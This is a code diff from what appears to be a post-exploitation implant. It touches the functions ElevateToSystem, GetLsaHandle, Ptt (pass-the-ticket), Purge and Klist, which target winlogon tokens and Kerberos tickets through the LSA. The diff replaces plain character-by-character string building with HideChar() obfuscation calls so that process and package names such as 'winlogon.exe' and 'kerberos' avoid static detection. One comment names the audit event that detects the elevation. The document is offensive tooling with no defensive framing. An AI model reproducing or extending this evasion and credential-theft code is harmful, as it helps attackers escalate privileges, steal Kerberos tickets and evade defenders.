@@ -69,19 +69,19 @@ BOOL ElevateToSystem()
     HANDLE            hToken         = FALSE;
     DWORD             ProcessID      = 0;
 
-    winlogon[ 0 ]  = 'w';
-    winlogon[ 12 ] = 0;
-    winlogon[ 1 ]  = 'i';
-    winlogon[ 2 ]  = 'n';
-    winlogon[ 3 ]  = 'l';
-    winlogon[ 4 ]  = 'o';
-    winlogon[ 5 ]  = 'g';
-    winlogon[ 6 ]  = 'o';
-    winlogon[ 7 ]  = 'n';
-    winlogon[ 8 ]  = '.';
-    winlogon[ 9 ]  = 'e';
-    winlogon[ 10 ] = 'x';
-    winlogon[ 11 ] = 'e';
+    winlogon[ 11 ] = HideChar('e');
+    winlogon[ 4 ]  = HideChar('o');
+    winlogon[ 2 ]  = HideChar('n');
+    winlogon[ 6 ]  = HideChar('o');
+    winlogon[ 7 ]  = HideChar('n');
+    winlogon[ 5 ]  = HideChar('g');
+    winlogon[ 12 ] = HideChar(0);
+    winlogon[ 3 ]  = HideChar('l');
+    winlogon[ 9 ]  = HideChar('e');
+    winlogon[ 8 ]  = HideChar('.');
+    winlogon[ 1 ]  = HideChar('i');
+    winlogon[ 0 ]  = HideChar('w');
+    winlogon[ 10 ] = HideChar('x');
     ProcessID = GetProcessIdByName(winlogon);
     if (ProcessID == -1)
     {
@@ -169,18 +169,17 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
     {
         // AuditPol.exe /set /subcategory:"Security System Extension"
         // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
-        // winlogon.exe.
-        char* name[10] = { 0 }; // Winlogon
-        name[ 2 ] =  'n';
-        name[ 8 ] =  'n';
-        name[ 4 ] =  'o';
-        name[ 0 ] =  'W';
-        name[ 1 ] =  'i';
-        name[ 7 ] =  'o';
-        name[ 6 ] =  'g';
-        name[ 3 ] =  'l';
-        name[ 9 ] =  '\0';
-        name[ 5 ] =  'o';
+        CHAR name[10] = { 0 }; // Winlogon
+        name[ 2 ] =  HideChar('n');
+        name[ 8 ] =  HideChar('n');
+        name[ 4 ] =  HideChar('o');
+        name[ 0 ] =  HideChar('W');
+        name[ 1 ] =  HideChar('i');
+        name[ 7 ] =  HideChar('o');
+        name[ 6 ] =  HideChar('g');
+        name[ 3 ] =  HideChar('l');
+        name[ 9 ] =  HideChar('\0');
+        name[ 5 ] =  HideChar('o');
         STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
         status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
         if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
@@ -407,17 +406,17 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     DWORD                    submitSize     = sizeof( KERB_SUBMIT_TKT_REQUEST ) + TicketSize;
     PVOID                    response       = NULL;
     ULONG                    responseSize   = 0;
-    CHAR                     name[9]        = { 0 };
+    CHAR                     name[9]       = { 0 };
 
-    name[5] = 'r';
-    name[0] = 'k';
-    name[8] = '\0';
-    name[1] = 'e';
-    name[2] = 'r';
-    name[7] = 's';
-    name[3] = 'b';
-    name[6] = 'o';
-    name[4] = 'e';
+    name[ 5 ] = HideChar('r');
+    name[ 0 ] = HideChar('k');
+    name[ 8 ] = HideChar( 0);
+    name[ 1 ] = HideChar('e');
+    name[ 2 ] = HideChar('r');
+    name[ 7 ] = HideChar('s');
+    name[ 3 ] = HideChar('b');
+    name[ 6 ] = HideChar('o');
+    name[ 4 ] = HideChar('e');
 
     krbAuth.Buffer = name;
 
@@ -499,17 +498,17 @@ BOOL Purge( HANDLE hToken, LUID luid )
     ULONG                        authPackage    = 0;
     PVOID                        purgeResponse  = NULL;
     ULONG                        responseSize   = 0;
-    CHAR                         name[9]        = { 0 };
+    CHAR                         name[9]       = { 0 };
 
-    name[5] = 'r';
-    name[0] = 'k';
-    name[8] = '\0';
-    name[1] = 'e';
-    name[2] = 'r';
-    name[7] = 's';
-    name[3] = 'b';
-    name[6] = 'o';
-    name[4] = 'e';
+    name[ 5 ] = HideChar('r');
+    name[ 0 ] = HideChar('k');
+    name[ 8 ] = HideChar( 0);
+    name[ 1 ] = HideChar('e');
+    name[ 2 ] = HideChar('r');
+    name[ 7 ] = HideChar('s');
+    name[ 3 ] = HideChar('b');
+    name[ 6 ] = HideChar('o');
+    name[ 4 ] = HideChar('e');
 
     krbAuth.Buffer = name;
 
@@ -591,17 +590,17 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     PSESSION_INFORMATION              TmpSession     = NULL;
     PTICKET_INFORMATION               TicketInfo     = NULL;
     PTICKET_INFORMATION               TmpTicketInfo  = NULL;
-    CHAR                              name[9]        = { 0 };
+    CHAR                              name[9]       = { 0 };
 
-    name[5] = 'r';
-    name[0] = 'k';
-    name[8] = '\0';
-    name[1] = 'e';
-    name[2] = 'r';
-    name[7] = 's';
-    name[3] = 'b';
-    name[6] = 'o';
-    name[4] = 'e';
+    name[ 5 ] = HideChar('r');
+    name[ 0 ] = HideChar('k');
+    name[ 8 ] = HideChar( 0);
+    name[ 1 ] = HideChar('e');
+    name[ 2 ] = HideChar('r');
+    name[ 7 ] = HideChar('s');
+    name[ 3 ] = HideChar('b');
+    name[ 6 ] = HideChar('o');
+    name[ 4 ] = HideChar('e');
 
     krbAuth.Buffer = name;
 
